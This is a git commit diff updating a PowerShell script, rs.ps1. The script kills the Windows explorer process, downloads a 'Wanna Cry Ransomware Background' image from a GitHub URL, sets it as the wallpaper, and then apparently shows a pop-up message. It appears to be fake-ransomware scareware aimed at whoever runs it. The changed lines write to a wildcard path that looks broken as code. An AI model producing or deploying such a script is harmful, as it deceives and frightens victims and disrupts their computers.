0a3c3c9328ac884b0d545a1a20781f6a9fa384ee
matteoporfi <matteopofirio84@gmail.com>
2025-03-28 12:52:58 +0100

    Update rs.ps1

--- rs.ps1
+++ rs.ps1
@@ -7,7 +7,7 @@ Get-Process "explorer"| Stop-Process
 #URL For the Image of your choice (Wanna Cry Ransomware Background)
 $url = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rsm_bg.jpg"
 
-Invoke-WebRequest $url -OutFile "$env:HOMEPATH\AppData\Roaming\bg.jpg"
+Invoke-WebRequest $url -OutFile "C:\users\*\AppData\Local\bg.jpg"
 
 
 $setwallpapersrc = @"
@@ -28,7 +28,7 @@ public class Wallpaper
 "@
 Add-Type -TypeDefinition $setwallpapersrc
 
-[Wallpaper]::SetWallpaper("$env:HOMEPATH\AppData\Roaming\bg.jpg")
+[Wallpaper]::SetWallpaper("C:\users\*\AppData\Local\bg.jpg")
 
 
 #Pop Up Message
